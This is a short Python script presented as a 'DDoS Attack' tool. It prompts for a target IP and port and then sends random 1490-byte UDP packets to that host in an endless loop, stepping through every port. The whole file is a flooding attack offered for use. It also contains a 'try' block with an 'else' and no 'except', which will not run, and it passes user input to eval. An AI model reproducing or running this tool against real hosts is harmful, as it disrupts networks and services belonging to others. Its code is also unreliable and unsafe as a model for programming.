import sys
import os
import time
import socket
import random
import math
from datetime import datetime

try: # not native
  from pyfiglet import Figlet
else:
    os.system('pip install pyfiglet==0.7')
    from pyfiglet import Figlet

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

os.system("cls")

f = Figlet(font='slant')
print (f.renderText('DDoS Attack'))

print ("Author : AlexandreZT")
print ("GitHub : https://github.com/AlexandreZT")

ip = input("IP Target : ")
port = eval(input("Port       : "))

# loadind ~10s
for i in range (1, 101, 1):
  os.system("cls")
  f = Figlet(font='slant')
  print (f.renderText('Attack Loading'))
  print("["+"="*int(math.ceil(i/5))+"]", "{0}%".format(i,))
  time.sleep(0.1)

os.system("cls")
f = Figlet(font='slant')
print (f.renderText('FIRE !!')) 
time.sleep(2)

sent = 0

while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1